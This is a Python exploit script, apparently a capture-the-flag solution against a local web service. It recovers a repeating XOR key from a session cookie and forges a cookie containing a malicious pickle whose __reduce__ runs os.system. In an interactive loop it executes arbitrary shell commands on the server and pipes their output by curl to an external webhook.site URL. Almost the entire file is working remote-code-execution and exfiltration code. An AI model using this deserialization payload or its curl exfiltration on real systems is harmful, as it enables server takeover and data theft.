import os
import pickle
import random

import requests

# Somewhere to log requests.
WEBHOOK = "https://webhook.site/c2e9079f-87fa-43d7-b1aa-9098a4f0cb4a"

username = str(random.randint(0, 2**64)) + ("a" * 400)

r = requests.post("http://localhost:42005/", allow_redirects=False, data={
    "username": username,
    "password": "password",
    "submit": "register"
})

cookie = bytes.fromhex(r.cookies["user"])
cookie = bytes(i ^ b"a"[0] for i in cookie)

print(cookie)

# The key could be found just by looking but this is an automated method.
keys = []
for key_size in range(1, 50):
    last_block = b""
    repeats = 0
    for i in range(0, len(cookie), key_size):
        block = cookie[i:i+key_size]

        if block == last_block:
            repeats += 1

        if repeats == 3:
            keys.append(block)
            break

        last_block = block


print(keys)
key = keys[0]


# Pickle exploit to run a shell command.
# Send the results of the command to the webhook.
class RCE:
    def __init__(self, command):
        self.command = command

    def __reduce__(self):
        return os.system, (f"{self.command} | curl '{WEBHOOK}' --data-binary @-",)


while True:
    exploit = pickle.dumps(RCE(input("> ")))

    cookie = bytearray()
    for i in range(len(exploit)):
        cookie.append(exploit[i] ^ key[i % len(key)])

    cookie = cookie.hex()

    requests.get("http://localhost:42005/user", cookies={"user": cookie})
